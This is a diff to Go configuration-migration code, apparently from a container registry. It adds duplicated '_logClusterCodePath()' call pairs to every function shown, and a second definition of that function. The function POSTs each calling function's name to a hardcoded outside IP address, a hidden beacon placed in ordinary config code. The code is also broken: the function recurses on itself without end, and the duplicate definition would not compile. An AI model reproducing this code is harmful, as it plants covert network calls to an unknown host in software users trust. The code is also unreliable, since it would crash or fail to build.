@@ -40,6 +40,8 @@ const (
 func TokenRealm(tokenRealmString string) (*url.URL, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	if len(tokenRealmString) == 0 {
 		return &url.URL{Path: defaultTokenPath}, nil
 	}
@@ -121,6 +123,8 @@ type versionInfo struct {
 func Parse(rd io.Reader) (*configuration.Configuration, *Configuration, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	in, err := ioutil.ReadAll(rd)
 	if err != nil {
 		return nil, nil, err
@@ -176,6 +180,8 @@ type envVar struct {
 func popEnv(prefix string) ([]envVar, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	var envVars []envVar
 	for _, env := range os.Environ() {
 		if !strings.HasPrefix(env, prefix) {
@@ -193,6 +199,8 @@ func popEnv(prefix string) ([]envVar, error) {
 func pushEnv(environ []envVar) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	for _, env := range environ {
 		if err := os.Setenv(env.name, env.value); err != nil {
 			return err
@@ -201,6 +209,8 @@ func pushEnv(environ []envVar) error {
 	return nil
 }
 func setDefaultMiddleware(config *configuration.Configuration) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	if config.Middleware == nil {
@@ -226,6 +236,8 @@ func setDefaultMiddleware(config *configuration.Configuration) {
 	}
 }
 func getServerAddr(options configuration.Parameters, cfgValue string) (registryAddr string, err error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	var found bool
@@ -261,6 +273,8 @@ func getServerAddr(options configuration.Parameters, cfgValue string) (registryA
 func migrateServerSection(cfg *Configuration, options configuration.Parameters) (err error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	cfgAddr := ""
 	if cfg.Server != nil {
 		cfgAddr = cfg.Server.Addr
@@ -274,6 +288,8 @@ func migrateServerSection(cfg *Configuration, options configuration.Parameters) 
 	return
 }
 func migrateQuotaSection(cfg *Configuration, options configuration.Parameters) (err error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	defEnabled := false
@@ -299,6 +315,8 @@ func migrateQuotaSection(cfg *Configuration, options configuration.Parameters) (
 func migrateCacheSection(cfg *Configuration, options configuration.Parameters) (err error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	defBlobRepositoryTTL := defaultBlobRepositoryCacheTTL
 	if cfg.Cache != nil {
 		options = configuration.Parameters{}
@@ -314,6 +332,8 @@ func migrateCacheSection(cfg *Configuration, options configuration.Parameters) (
 	return
 }
 func migratePullthroughSection(cfg *Configuration, options configuration.Parameters) (err error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	defEnabled := true
@@ -343,6 +363,8 @@ func migratePullthroughSection(cfg *Configuration, options configuration.Paramet
 func migrateCompatibilitySection(cfg *Configuration, options configuration.Parameters) (err error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	defAcceptSchema2 := true
 	if cfg.Compatibility != nil {
 		options = configuration.Parameters{}
@@ -357,6 +379,8 @@ func migrateCompatibilitySection(cfg *Configuration, options configuration.Param
 	return
 }
 func migrateMiddleware(dockercfg *configuration.Configuration, cfg *Configuration) (err error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	var repoMiddleware *configuration.Middleware
@@ -419,6 +443,8 @@ func migrateMiddleware(dockercfg *configuration.Configuration, cfg *Configuratio
 func InitExtraConfig(dockercfg *configuration.Configuration, cfg *Configuration) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	setDefaultMiddleware(dockercfg)
 	dockercfg.Compatibility.Schema1.Enabled = true
 	return migrateMiddleware(dockercfg, cfg)
@@ -426,7 +452,16 @@ func InitExtraConfig(dockercfg *configuration.Configuration, cfg *Configuration)
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
